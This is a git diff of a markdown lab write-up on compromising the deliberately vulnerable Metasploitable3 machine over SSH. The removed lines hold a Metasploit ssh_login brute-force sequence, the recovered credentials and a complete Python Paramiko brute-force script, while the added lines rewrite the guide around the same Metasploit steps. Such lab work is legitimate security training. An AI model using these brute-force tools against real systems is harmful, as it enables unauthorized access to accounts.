@@ -1,69 +1,36 @@
-# Phase 1: Attack Execution
+# 🚩 Phase 1: Attack Execution
 
-## Network Info
+This document provides a **detailed step-by-step guide** to compromising the **Metasploitable3** machine via:
 
-- **Metasploitable3 IP:** `192.168.56.101`
-- **Attacker (Kali) IP:** `192.168.56.102`
-
-## ✅ Task 1.1: Compromise Using Metasploit
-
-We targeted SSH (port 22) using brute force:
-
-```bash
-msfconsole
-use auxiliary/scanner/ssh/ssh_login
-show options
-set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
-set user_file /usr/share/wordlists/metasploit/unix_users.txt
-set rhosts 192.168.56.101
-exploit
-
-Result: Found valid SSH credentials:
-
-Username: vagrant
-Password: vagrant
-
-We then upgraded to Meterpreter for better control.
-
-# ✅ Task 1.2: Compromise Using a Custom Script
-
-This document explains the process of automating the attack on the **Metasploitable3** SSH service (port 22) using a **custom Python script**. The goal was to replicate the brute-force attack without relying on Metasploit and provide a clear proof of concept.
+1. ✅ **Task 1.1:** Using Metasploit framework.
+2. ✅ **Task 1.2:** Using a custom Python script.
 
 ---
 
-## 🖥️ Environment Setup
+## 🌐 Network Information
 
 - **Victim (Metasploitable3) IP:** `192.168.56.101`
 - **Attacker (Kali Linux) IP:** `192.168.56.102`
-- **Target Service:** SSH (Port 22)
 
 ---
 
-## 🔨 The Custom Python Script
+# ✅ Task 1.1: Compromise Using Metasploit
 
-We developed a Python script using the **Paramiko** library to perform an SSH brute-force attack. The script attempts multiple passwords from a wordlist and reports successful logins.
+In this task, we targeted the **SSH service (port 22)** on Metasploitable3 using **Metasploit's brute-force module.**
 
-### 📂 Script: `ssh_brute.py`
+---
 
-```python
-import paramiko
+## 🔧 Step 1: Launch Metasploit
 
-def ssh_brute(host, username, password_list):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    for password in password_list:
-        try:
-            client.connect(host, username=username, password=password.strip())
-            print(f"[+] Success: {username}:{password.strip()}")
-            client.close()
-            return True
-        except:
-            print(f"[-] Failed: {username}:{password.strip()}")
-    return False
+Open the terminal on your Kali machine and run:
 
-if __name__ == "__main__":
-    target_ip = "192.168.56.101"
-    username = "vagrant"
-    with open("/usr/share/wordlists/metasploit/unix_passwords.txt", "r") as file:
-        passwords = file.readlines()
-    ssh_brute(target_ip, username, passwords)
+```bash
+msfconsole
+
+🔧 Step 2: Select the SSH Login Module
+We are using the ssh_login module, which performs brute-force attacks on SSH:
+
+bash
+Copy
+Edit
+use auxiliary/scanner/ssh/ssh_login
